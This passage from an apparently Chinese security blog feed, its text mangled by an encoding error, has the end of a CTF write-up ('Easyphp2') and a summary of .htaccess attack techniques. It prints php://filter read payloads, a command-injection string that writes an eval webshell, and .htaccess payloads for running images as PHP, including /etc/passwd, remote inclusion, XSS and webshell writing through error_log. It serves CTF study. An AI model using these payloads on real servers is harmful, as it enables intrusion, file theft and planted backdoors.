2020]Easyphp2</h1><p>è¿›å…¥é¢˜ç›®é¡µé¢ï¼Œå‘ç°url<code>/?file=GWHT.php</code>,åº”è¯¥æ˜¯æ–‡ä»¶åŒ…å«ï¼Œå°è¯•ä¼ªåè®®è¯»å–ï¼Œå‘ç°base64å’Œrot13éƒ½è¢«banæ‰ï¼Œä½†<code>convert.quoted-printable-encode</code>æ²¡banï¼Œè¯»å–æ–‡ä»¶ï¼š</p><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.quoted-printable-encode/</span>resource=GWHT.php</code></pre><p>1<img src="/2021/08/11/ffi/4.png" alt="4" style="zoom: 33%;"></p><p>ä¹Ÿå¯ä»¥ç”¨baseç¼–ç ï¼Œurlä¸¤æ¬¡ç¼–ç å³å¯ç»•è¿‡é™åˆ¶ï¼š</p><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.%6%32ase64-encode/</span>resource=GWHT.php</code></pre><p>è§£ç åæ•´ç†ä¸€ä¸‹æœ‰ç”¨çš„ä»£ç ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>   ini_set(<span class="hljs-string">&#x27;max_execution_time&#x27;</span>, <span class="hljs-number">5</span>);   <span class="hljs-keyword">if</span> ($_COOKIE[<span class="hljs-string">&#x27;pass&#x27;</span>] !== getenv(<span class="hljs-string">&#x27;PASS&#x27;</span>)) &#123;       setcookie(<span class="hljs-string">&#x27;pass&#x27;</span>, <span class="hljs-string">&#x27;PASS&#x27;</span>);       <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="hljs-string">&#x27;&lt;hacker&gt;&#x27;</span>.<span class="hljs-string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>.<span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="hljs-string">&#x27;404&#x27;</span>.<span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>.<span class="hljs-string">&#x27;Sorry, only people from GWHT are allowed to access this website.&#x27;</span>.<span class="hljs-string">&#x27;23333&#x27;</span>);   &#125;   <span class="hljs-meta">?&gt;</span>   <span class="hljs-meta">&lt;?php</span>   <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;count&quot;</span>])) &#123;       $count = $_GET[<span class="hljs-string">&quot;count&quot;</span>];       <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#x27;</span>, $count))&#123;       <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);       &#125;       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;The Count is: &quot;</span> . exec(<span class="hljs-string">&#x27;printf \&#x27;&#x27;</span> . $count . <span class="hljs-string">&#x27;\&#x27; | wc -c&#x27;</span>) . <span class="hljs-string">&quot;&lt;/h2&gt;&quot;</span>;   &#125;   <span class="hljs-meta">?&gt;</span></code></pre><p>å…ˆåˆ¤æ–­cookieï¼ŒGETä¼ countå‚æ•°ï¼›è®¾ç½®äº†ä¸€ä¸ªæ‰§è¡Œæ—¶é—´ï¼Œéœ€è¦å¾—åˆ°ç¯å¢ƒå˜é‡çš„å€¼ï¼›robots.txtå¾—åˆ°æç¤ºè¯»checkï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$pass = <span class="hljs-string">&quot;GWHT&quot;</span>;<span class="hljs-comment">// Cookie password.</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Here is nothing, isn&#x27;t it ?&quot;</span>;header(<span class="hljs-string">&#x27;Location: /&#x27;</span>);</code></pre><p>å¾—åˆ°å¯†ç ï¼Œå‘½ä»¤æ‰§è¡Œexec(â€˜printf â€˜â€™ . $count . â€˜â€™ | wc -câ€™)ï¼Œexecå‘½ä»¤æ— å›æ˜¾ï¼Œå¯ä»¥ç›´æ¥å†™å…¥shellï¼š</p><pre><code class="hljs mojolicious"><span class="xml">?file=GWHT.php&amp;count=&#x27;|echo+&quot;<span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="perl"><span class="hljs-number">3</span>f%3d+<span class="hljs-keyword">eval</span>(\$_POST[<span class="hljs-string">&#x27;shell&#x27;</span>])%3f&gt;<span class="hljs-string">&quot;+&gt;+a.php&#x27;</span></span></code></pre><p>è¿æ¥èšå‰‘ï¼Œ<code>find / -name &quot;flag*&quot;</code>æ‰¾åˆ°flagè·¯å¾„ï¼Œæƒé™é—®é¢˜è¯»ä¸äº†/GWHT/system/of/a/down/flag.txtï¼Œåœ¨READMEé‡Œé¢æœ‰ä¸ªhashï¼ŒMD5è§£ç ä¸ºGWHTCTFï¼Œ</p><p><img src="/2021/08/11/ffi/5.png" alt="5"></p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/twosmi1e/p/14230691.html#">https://www.cnblogs.com/twosmi1e/p/14230691.html#</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>.htaccess</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>.htaccessæ€»ç»“</title>
    <link href="/2021/08/10/hta/"/>
    <url>/2021/08/10/hta/</url>
    
    <content type="html"><![CDATA[<p>ç»å¸¸ç¢°åˆ°ä¸€äº›é¢˜ç›®éœ€è¦å€ŸåŠ©.htaccessï¼Œä¸”ç”¨æ³•å¾ˆå¤šï¼Œè¿™é‡Œæ¥åšä¸€ä¸ªæ€»ç»“ã€‚</p><h4 id="æ¦‚å¿µ"><a class="header-anchor" href="#æ¦‚å¿µ">ğŸ­</a>æ¦‚å¿µ</h4><p>.htaccessæ–‡ä»¶(â€œåˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€ï¼‰,å…¨ç§°æ˜¯Hypertext Access(è¶…æ–‡æœ¬å…¥å£)ã€‚æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ  å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ  ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„<a href="https://baike.baidu.com/item/AllowOverride">AllowOverride</a>æŒ‡ä»¤æ¥è®¾ç½®ã€‚</p><p>.htaccess ä¸­æœ‰ <code>#</code> å•è¡Œæ³¨é‡Šç¬¦ï¼Œä¸”æ”¯æŒ <code>\</code> æ‹¼æ¥ä¸Šä¸‹ä¸¤è¡Œã€‚</p><p>.htaccess æ–‡ä»¶ä¸­çš„é…ç½®æŒ‡ä»¤ä½œç”¨äº .htaccess æ–‡ä»¶æ‰€åœ¨çš„<strong>ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•</strong>ï¼Œä½†å…¶ä¸Šçº§ç›®å½•ä¹Ÿå¯èƒ½ä¼šæœ‰ .htaccess æ–‡ä»¶ï¼Œè€ŒæŒ‡ä»¤æ˜¯æŒ‰æŸ¥æ‰¾é¡ºåºä¾æ¬¡ç”Ÿæ•ˆçš„ï¼Œæ‰€ä»¥ä¸€ä¸ªç‰¹å®šç›®å½•ä¸‹çš„ .htaccess æ–‡ä»¶ä¸­çš„æŒ‡ä»¤å¯èƒ½ä¼šè¦†ç›–å…¶ä¸Šçº§ç›®å½•ä¸­çš„  .htaccess æ–‡ä»¶ä¸­çš„æŒ‡ä»¤ï¼Œå³å­ç›®å½•ä¸­çš„æŒ‡ä»¤ä¼šè¦†ç›–çˆ¶ç›®å½•æˆ–è€…ä¸»é…ç½®æ–‡ä»¶ä¸­çš„æŒ‡ä»¤ã€‚</p><h4 id="é…ç½®"><a class="header-anchor" href="#é…ç½®">ğŸ­</a>é…ç½®</h4><pre><code class="hljs css"><span class="hljs-selector-tag">AllowOverride</span>  <span class="hljs-selector-tag">All</span>    # å¯åŠ¨<span class="hljs-selector-class">.htaccess</span>æ–‡ä»¶çš„ä½¿ç”¨<span class="hljs-selector-tag">AccessFileName</span>  <span class="hljs-selector-class">.config</span>    # å°†<span class="hljs-selector-class">.htaccess</span>ä¿®æ”¹ä¸º<span class="hljs-selector-class">.config</span></code></pre><h4 id="ä½œç”¨"><a class="header-anchor" href="#ä½œç”¨">ğŸ­</a>ä½œç”¨</h4><p>å¯ä»¥å®ç°ç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚</p><h4 id="SetHandler"><a class="header-anchor" href="#SetHandler">ğŸ­</a>SetHandler</h4><p>å¯ä»¥å¼ºåˆ¶æ‰€æœ‰åŒ¹é…çš„æ–‡ä»¶è¢«ä¸€ä¸ªæŒ‡å®šçš„å¤„ç†å™¨å¤„ç†ã€‚</p><p>ç”¨æ³•ï¼š</p><pre><code class="hljs pgsql">SetHandler <span class="hljs-keyword">handler</span>-<span class="hljs-type">name</span>|<span class="hljs-keyword">None</span></code></pre><p>å¦‚ï¼š</p><pre><code class="hljs applescript">SetHandler <span class="hljs-built_in">application</span>/x-httpd-php<span class="hljs-comment">#å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šè¢«å½“åš php è§£æ</span>SetHandler server-status<span class="hljs-comment">#å¼€å¯ Apache çš„æœåŠ¡å™¨çŠ¶æ€ä¿¡æ¯ï¼ˆserver-status æ˜¯ Apache è‡ªå¸¦ä¸€ä¸ªæŸ¥çœ‹ Apache çŠ¶æ€çš„åŠŸèƒ½æ¨¡å—ï¼‰ï¼Œå¯ä»¥æŸ¥çœ‹æ‰€æœ‰è®¿é—®æœ¬ç«™çš„è®°å½•</span></code></pre><h4 id="AddHandler"><a class="header-anchor" href="#AddHandler">ğŸ­</a>AddHandler</h4><p>å®ç°åœ¨æ–‡ä»¶æ‰©å±•åä¸ç‰¹å®šçš„å¤„ç†å™¨ä¹‹é—´å»ºç«‹æ˜ å°„</p><p>ç”¨æ³•ï¼š</p><pre><code class="hljs mipsasm"><span class="hljs-keyword">AddHandler </span>handler-name <span class="hljs-keyword">extensive </span>[<span class="hljs-keyword">extensive] </span>...</code></pre><p>å¦‚ï¼š</p><pre><code class="hljs mipsasm"><span class="hljs-keyword">AddHandler </span>cgi-<span class="hljs-keyword">script </span>.xxx<span class="hljs-comment">#å°†æ‰©å±•åä¸º .xxx çš„æ–‡ä»¶ä½œä¸º CGI è„šæœ¬æ¥å¤„ç†</span></code></pre><h4 id="php-value"><a class="header-anchor" href="#php-value">ğŸ­</a>php_value</h4><p>è®¾å®šæŒ‡å®šçš„ PHP çš„é…ç½®å€¼ã€‚è¦æ¸…é™¤å…ˆå‰è®¾å®šçš„å€¼ï¼ŒæŠŠ value è®¾ä¸º noneã€‚ä½†æ˜¯ php_value ä¸èƒ½ç”¨æ¥è®¾å®šå¸ƒå°”å€¼ï¼Œå¦‚æœè¦è®¾å®šå¸ƒå°”å€¼çš„è¯åº”è¯¥ç”¨ php_flagã€‚</p><p>ç”¨æ³•ï¼š</p><pre><code class="hljs ceylon">php<span class="hljs-number">_</span><span class="hljs-keyword">value</span> name <span class="hljs-keyword">value</span></code></pre><p>ä¸æ˜¯æ‰€æœ‰çš„ PHP é…ç½®éƒ½å¯ä»¥ç”¨ php_value æ¥è®¾å®šï¼Œå®ƒåªèƒ½ç”¨äº PHP_INI_ALL æˆ– PHP_INI_PERDIR ç±»å‹çš„æŒ‡ä»¤ï¼š</p><p><img src="/2021/08/10/hta/1.png" alt="1"></p><p>å¦‚</p><pre><code class="hljs css"><span class="hljs-selector-tag">php_value</span> <span class="hljs-selector-tag">auto_prepend_file</span> <span class="hljs-selector-tag">images</span><span class="hljs-selector-class">.png</span>#è®¾ç½®è®¿é—®ä¸€ä¸ª <span class="hljs-selector-tag">PHP</span> æ–‡ä»¶æ—¶ï¼Œåœ¨è¯¥æ–‡ä»¶è§£æä¹‹å‰ä¼šå…ˆè‡ªåŠ¨åŒ…å«å¹¶è§£æ <span class="hljs-selector-tag">images</span><span class="hljs-selector-class">.png</span> æ–‡ä»¶</code></pre><h4 id="php-flag"><a class="header-anchor" href="#php-flag">ğŸ­</a>php_flag</h4><p>è®¾å®šå¸ƒå°”å€¼ç±»å‹çš„ PHP é…ç½®é€‰é¡¹ã€‚</p><p>ç”¨æ³•ï¼š</p><pre><code class="hljs applescript">php_flag <span class="hljs-built_in">name</span> <span class="hljs-keyword">on</span>|off</code></pre><p>php_flag å¯ä»¥è®¾å®šçš„é…ç½®ä¹Ÿæ˜¯æœ‰èŒƒå›´çš„ï¼š</p><p><img src="/2021/08/10/hta/2.png" alt="2"></p><p>å®ä¾‹</p><pre><code class="hljs angelscript">php_flag engine <span class="hljs-number">0</span>#å°† engine è®¾ç½®ä¸º <span class="hljs-number">0</span>ï¼Œå³åœ¨æœ¬ç›®å½•å’Œå­ç›®å½•ä¸­å…³é—­ PHP è§£æï¼Œå¯ä»¥é€ æˆæºç æ³„éœ²</code></pre><h4 id="AddType"><a class="header-anchor" href="#AddType">ğŸ­</a>AddType</h4><p>å°†ç»™å®šçš„æ–‡ä»¶æ‰©å±•åæ˜ å°„åˆ°æŒ‡å®šçš„å†…å®¹ç±»å‹ã€‚</p><p>ç”¨æ³•ï¼š</p><pre><code class="hljs mipsasm"><span class="hljs-keyword">AddType </span>media-type <span class="hljs-keyword">extensive </span>[<span class="hljs-keyword">extensive] </span>...</code></pre><p>å¦‚</p><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .gif<span class="hljs-comment">#æŠŠ gif ä¸ºåç¼€çš„æ–‡ä»¶å½“åš php æ–‡ä»¶è§£æã€‚</span>AddType <span class="hljs-built_in">application</span>/x-httpd-php png jpg gif<span class="hljs-comment">#æŠŠ .png .jpg .gif å¤šä¸ªåç¼€çš„æ–‡ä»¶å½“åš php è§£æ</span></code></pre><h2 id="åˆ©ç”¨"><a class="header-anchor" href="#åˆ©ç”¨">ğŸ­</a>åˆ©ç”¨</h2><h4 id="å›¾ç‰‡é©¬è§£æ"><a class="header-anchor" href="#å›¾ç‰‡é©¬è§£æ">ğŸ­</a>å›¾ç‰‡é©¬è§£æ</h4><p>åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸­ç»å¸¸é‡åˆ°ä¸Šä¼ å›¾ç‰‡é©¬çš„æƒ…å†µï¼Œå¦‚æœç›®æ ‡ç¯å¢ƒå¼€å¯äº†  .htaccess å¹¶ä¸”ä¸Šä¼ çš„é»‘åå•æ²¡æœ‰é™åˆ¶ .htaccess æ–‡ä»¶çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆä¸Šä¼  .htaccess  æ–‡ä»¶ï¼Œå¯¹ç›®æ ‡ç¯å¢ƒçš„ç›®å½•è¿›è¡Œç›¸åº”çš„é…ç½®ï¼Œç„¶åå†ä¸Šä¼ å›¾ç‰‡ï¼Œä½¿å›¾ç‰‡çš„ PHP æ¶æ„ä»£ç å¾—ä»¥è¢«ç›´æ¥è§£ææ‰§è¡Œã€‚</p><p>å¸¸ç”¨æŒ‡ä»¤ï¼š</p><blockquote><p>SetHandler æŒ‡ä»¤<br>å¼ºåˆ¶å°†æ‰€æœ‰åŒ¹é…çš„æ–‡ä»¶è¢« PHP å¤„ç†å™¨å¤„ç†å¹¶è§£æï¼š</p><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash"><span class="hljs-comment"># å°†images.png å½“åš php æ‰§è¡Œ</span></span><span class="hljs-meta">&gt;</span><span class="bash">&lt;FilesMatch <span class="hljs-string">&quot;images.png&quot;</span>&gt;</span>SetHandler application/x-httpd-php<span class="hljs-meta">&gt;</span><span class="bash">&lt;/FilesMatch&gt;</span></code></pre></blockquote><blockquote><p>AddType æŒ‡ä»¤</p><p>å°†ç»™å®šçš„æ–‡ä»¶æ‰©å±•åæ˜ å°„åˆ° PHP çš„å†…å®¹ç±»å‹ï¼š</p><pre><code class="hljs applescript"><span class="hljs-comment"># å°† .jpg å½“åš php æ–‡ä»¶è§£æ</span>AddType <span class="hljs-built_in">application</span>/x-httpd-php .png</code></pre></blockquote><p>è¿™ä¸¤ç§é…ç½®éƒ½å¯ä»¥ä½¿æˆ‘ä»¬ä¸Šä¼ çš„é PHP ç±»å‹çš„ Webshell è¢«å½“åš PHP ç›´æ¥è§£æ.</p><h4 id="æ–‡ä»¶åŒ…å«"><a class="header-anchor" href="#æ–‡ä»¶åŒ…å«">ğŸ­</a>æ–‡ä»¶åŒ…å«</h4><h5 id="æœ¬åœ°æ–‡ä»¶åŒ…å«"><a class="header-anchor" href="#æœ¬åœ°æ–‡ä»¶åŒ…å«">ğŸ­</a>æœ¬åœ°æ–‡ä»¶åŒ…å«</h5><p>åœ¨æœ¬ç›®å½•æˆ–å­ç›®å½•ä¸­æœ‰å¯è§£æçš„ PHP æ–‡ä»¶æ—¶ï¼Œå¯ä»¥é€šè¿‡ php_value æ¥è®¾ç½® auto_prepend_file æˆ–è€… auto_append_file  é…ç½®é€‰é¡¹æ¥è®©æ‰€æœ‰çš„ PHP æ–‡ä»¶è‡ªåŠ¨åŒ…å«ä¸€äº›æ•æ„Ÿæ–‡ä»¶æˆ–æ¶æ„æ–‡ä»¶ï¼ˆå¦‚WebShellï¼‰ï¼Œæ¥è§¦å‘æ–‡ä»¶åŒ…å«ã€‚</p><p>å¦‚åŒ…å« /etc/passwdï¼š</p><blockquote><p>auto_prepend_file</p><pre><code class="hljs awk">php_value auto_prepend_file <span class="hljs-regexp">/etc/</span>passwd</code></pre></blockquote><blockquote><p>auto_append_file</p><pre><code class="hljs awk">php_value auto_append_file <span class="hljs-regexp">/etc/</span>passwd</code></pre></blockquote><p>è¿™ä¸¤ä¸ªé…ç½®é€‰é¡¹ç”¨äºè®¾ç½®è®¿é—®ä¸€ä¸ª PHP æ–‡ä»¶æ—¶ï¼Œåœ¨è¯¥ PHP æ–‡ä»¶è§£æä¹‹å‰ä¼šå…ˆè‡ªåŠ¨åŒ…å«å¹¶è§£æçš„æ–‡ä»¶ã€‚å¦‚ï¼šç›®æ ‡ç¯å¢ƒçš„å½“å‰ç›®å½•ä¸­å­˜åœ¨è‡³å°‘ä¸€ä¸ª PHP æ–‡ä»¶ä¸”ä¸Šä¼ é»‘åå•æ²¡æœ‰é™åˆ¶ .htaccess æ–‡ä»¶ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥è®© index.php æ–‡ä»¶åŒ…å«ä¸€ä¸ªå«æœ‰ Webshell çš„æ–‡ä»¶æ¥ Getshellï¼Œå¯ç”¨äºå›¾ç‰‡é©¬çš„è§£æï¼š</p><pre><code class="hljs angelscript">php_value <span class="hljs-built_in">auto</span>_prepend_file images.pngæˆ–:php_value <span class="hljs-built_in">auto</span>_append_file images.png</code></pre><h5 id="è¿œç¨‹æ–‡ä»¶åŒ…å«"><a class="header-anchor" href="#è¿œç¨‹æ–‡ä»¶åŒ…å«">ğŸ­</a>è¿œç¨‹æ–‡ä»¶åŒ…å«</h5><p>PHP çš„ allow_url_includeé»˜è®¤æ˜¯å…³é—­çš„ï¼Œå¦‚æœå¼€å¯çš„è¯å°±å¯ä»¥è¿›è¡Œè¿œç¨‹åŒ…å«ã€‚å› ä¸º allow_url_include çš„é…ç½®èŒƒå›´ä¸º  PHP_INI_SYSTEMï¼Œæ‰€ä»¥æ— æ³•åˆ©ç”¨ php_flag æŒ‡ä»¤åœ¨ .htaccess æ–‡ä»¶ä¸­å¼€å¯ã€‚å½“ allow_url_include=Onæ—¶<code>.htaccess </code>æ–‡ä»¶ä¸­çš„è®¾ç½®ä¸ºï¼š</p><pre><code class="hljs angelscript">php_value <span class="hljs-built_in">auto</span>_prepend_file http:<span class="hljs-comment">//192.168.0.181/phpinfo.txt</span>æˆ–:php_value <span class="hljs-built_in">auto</span>_append_file http:<span class="hljs-comment">//192.168.0.181/phpinfo.txt</span></code></pre><p>è¿œç¨‹ä¸»æœºä¸Šçš„phpinfo.txtå°±å¯ä»¥å†™ä¸€äº›æ¶æ„ä»£ç ã€‚</p><h4 id="ä»»æ„ä»£ç æ‰§è¡Œ"><a class="header-anchor" href="#ä»»æ„ä»£ç æ‰§è¡Œ">ğŸ­</a>ä»»æ„ä»£ç æ‰§è¡Œ</h4><h5 id="é€šè¿‡-PHP-ä¼ªåè®®"><a class="header-anchor" href="#é€šè¿‡-PHP-ä¼ªåè®®">ğŸ­</a>é€šè¿‡ PHP ä¼ªåè®®</h5><p>åˆ©ç”¨ auto_prepend_file æˆ– auto_append_file è¿™ä¸¤ä¸ªé…ç½®é¡¹ã€‚æ¡ä»¶ï¼š</p><ul><li>allow_url_fopen=On</li><li>allow_url_include=On</li><li>ç›®æ ‡ç¯å¢ƒçš„å½“å‰ç›®å½•ä¸­å­˜åœ¨è‡³å°‘ä¸€ä¸ª PHP æ–‡ä»¶</li></ul><pre><code class="hljs xquery">php_value auto_append_file data://<span class="hljs-type">text</span>/plain;base64,PD9waHAgcGhwaW5mbygpOz8+æˆ–:php_value auto_append_file data://<span class="hljs-type">text</span>/plian,<span class="hljs-meta">%3c</span><span class="hljs-meta">%3fphp</span>+phpinfo()<span class="hljs-meta">%3b</span><span class="hljs-meta">%3f</span><span class="hljs-meta">%3e</span>// å¦‚æœä¸ä½¿ç”¨base64åŠ å¯†åˆ™æ³¨æ„éœ€è¦urlç¼–ç </code></pre><h5 id="é€šè¿‡è§£æ-htaccess-æ–‡ä»¶"><a class="header-anchor" href="#é€šè¿‡è§£æ-htaccess-æ–‡ä»¶">ğŸ­</a>é€šè¿‡è§£æ .htaccess æ–‡ä»¶</h5><blockquote><p>é€šè¿‡åŒ…å« .htaccess è‡ªèº«</p><pre><code class="hljs php-template"><span class="xml">php_value auto_append_file .htaccess</span><span class="xml">#</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span></code></pre></blockquote><blockquote><p>ç›´æ¥å°† .htaccess æ–‡ä»¶å½“åš PHPæ–‡ä»¶å¤„ç†</p><p>å½“ç›®æ ‡ç¯å¢ƒå½“å‰ç›®å½•æˆ–å­ç›®å½•ä¸‹æ²¡æœ‰ PHP æ–‡ä»¶çš„æƒ…å†µä¸‹ï¼Œéœ€è¦å…ˆåœ¨ .htaccess é‡Œé¢è®¾ç½®å…è®¸è®¿é—® .htaccess æ–‡ä»¶ï¼Œå¦åˆ™ä¼šForbiddenï¼š</p><pre><code class="hljs gams">&gt;&lt;<span class="hljs-keyword">Files</span> ~ <span class="hljs-string">&quot;^.ht&quot;</span>&gt;Require <span class="hljs-keyword">all</span> grantedOrder allow,denyAllow from <span class="hljs-keyword">all</span>&gt;&lt;/<span class="hljs-keyword">Files</span>&gt;</code></pre><p>ç„¶åå†è®¾ç½®å°† .htaccess æŒ‡å®šå½“åš PHP æ–‡ä»¶å¤„ç†å¹¶è§£æï¼š</p><pre><code class="hljs php-template"><span class="xml">&gt;SetHandler application/x-httpd-php</span><span class="xml">&gt;# </span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span></code></pre><p>ç›´æ¥è®¿é—® .htaccess æ–‡ä»¶å³å¯æŠŠ .htaccess æ–‡ä»¶å½“åš PHP æ–‡ä»¶å¤„ç†å¹¶æ‰§è¡Œé‡Œé¢çš„ PHP ä»£ç ã€‚</p></blockquote><h4 id="è¿›è¡Œ-XSS-æ”»å‡»"><a class="header-anchor" href="#è¿›è¡Œ-XSS-æ”»å‡»">ğŸ­</a>è¿›è¡Œ XSS æ”»å‡»</h4><h5 id="é€šè¿‡è®¾ç½®-highlight-file"><a class="header-anchor" href="#é€šè¿‡è®¾ç½®-highlight-file">ğŸ­</a>é€šè¿‡è®¾ç½® highlight_file</h5><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ .htaccess æ–‡ä»¶è®¾å®š highlight.comment é€‰é¡¹ï¼ŒæŒ‡å®šéœ€è¦é«˜äº®çš„å†…å®¹ï¼Œä»è€Œè¿›è¡Œ XSSã€‚</p><p>.htaccessï¼š</p><pre><code class="hljs xml">php_value highlight.comment &#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&#x27;</code></pre><p>index.php:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-comment">// comment</span></code></pre><p>è®¿é—®index.phpå³å¯è§¦å‘ XSSã€‚</p><h5 id="é€šè¿‡é”™è¯¯æ¶ˆæ¯é“¾æ¥"><a class="header-anchor" href="#é€šè¿‡é”™è¯¯æ¶ˆæ¯é“¾æ¥">ğŸ­</a>é€šè¿‡é”™è¯¯æ¶ˆæ¯é“¾æ¥</h5><p>.htaccess ï¼š</p><pre><code class="hljs apache"><span class="hljs-attribute">php_flag</span> display_errors <span class="hljs-number">1</span><span class="hljs-attribute">php_flag</span> html_errors <span class="hljs-number">1</span><span class="hljs-attribute">php_value</span> docref_root <span class="hljs-string">&quot;&#x27;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;</span></code></pre><p>index.php:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;foo&#x27;</span>); <span class="hljs-comment">// è¿™é‡Œä¼šæŠ¥é”™</span></code></pre><h4 id="è‡ªå®šä¹‰é”™è¯¯æ–‡ä»¶ï¼ˆå¯å†™Webshellï¼‰"><a class="header-anchor" href="#è‡ªå®šä¹‰é”™è¯¯æ–‡ä»¶ï¼ˆå¯å†™Webshellï¼‰">ğŸ­</a>è‡ªå®šä¹‰é”™è¯¯æ–‡ä»¶ï¼ˆå¯å†™Webshellï¼‰</h4><p>error_log å¯ä»¥å°† PHP è¿è¡ŒæŠ¥é”™çš„è®°å½•å†™åˆ°æŒ‡å®šæ–‡ä»¶ä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ .htaccess æ–‡ä»¶è®¾å®š error_log é€‰é¡¹æ¥è‡ªå®šä¹‰é”™è¯¯æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„ï¼Œå¹¶ä»¥æ­¤æ¥å†™å…¥Webshellï¼š</p><pre><code class="hljs awk">php_value error_log <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>shell.phpphp_value include_path <span class="hljs-string">&quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span><span class="hljs-comment"># include_path ç”¨æ¥å°†include()çš„é»˜è®¤ç›®å½•è·¯å¾„æ”¹å˜</span></code></pre><p>index.phpå’Œä¸Šé¢ä¸€æ ·ï¼Œè®¿é—® index.phpï¼Œä¼šæŠ¥é”™å¹¶è®°å½•åœ¨ shell.php æ–‡ä»¶ä¸­ï¼Œä½†æ˜¯ <code>&lt;</code> ç­‰å­—ç¬¦ä¼šç»è¿‡ html ç¼–ç ï¼Œæˆ‘ä»¬éœ€è¦ç”¨ UTF-7 ç¼–ç æ ¼å¼æ¥ç»•è¿‡ï¼Œè¯¦è§ï¼šbuu é‡Œçš„[XNUCA2019Qualifier]EasyPHP</p><h4 id="ç»•è¿‡-ç‰¹æ®Šå­—ç¬¦"><a class="header-anchor" href="#ç»•è¿‡-ç‰¹æ®Šå­—ç¬¦">ğŸ­</a>ç»•è¿‡ &lt;? ç‰¹æ®Šå­—ç¬¦</h4><p>æœ‰æ—¶å€™ç›®æ ‡ç¯å¢ƒä¼šé™åˆ¶æˆ‘ä»¬ä¸Šä¼ æˆ–å†™å…¥çš„æ–‡ä»¶å†…å®¹ä¸­ä¸èƒ½å­˜åœ¨ <code>&lt;?</code> ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥ä½¿ç”¨ .htaccess æ¥ç»•è¿‡ã€‚</p><h5 id="Base64-ç¼–ç ç»•è¿‡"><a class="header-anchor" href="#Base64-ç¼–ç ç»•è¿‡">ğŸ­</a>Base64 ç¼–ç ç»•è¿‡</h5><p>åˆ©ç”¨ auto_append_file å’Œ PHP ä¼ªåè®®ï¼Œæ¯”å¦‚æˆ‘ä»¬åœ¨ä¸€ä¸ªå›¾ç‰‡ä¸­å†™å…¥ç»è¿‡base64ç¼–ç åçš„ Webshellï¼Œç„¶åæˆ‘ä»¬ä¾¿å¯ä»¥ä½¿ç”¨ auto_append_file é…åˆ php://filter å°†å…¶åŒ…å«è¿›æ¥ï¼š</p><pre><code class="hljs nginx"><span class="hljs-attribute">php_value</span> auto_append_file <span class="hljs-string">&quot;php://filter/convert.base64-decode/resource=images.png&quot;</span><span class="hljs-comment"># images.png ä¸­æ˜¯ç»è¿‡base64ç¼–ç 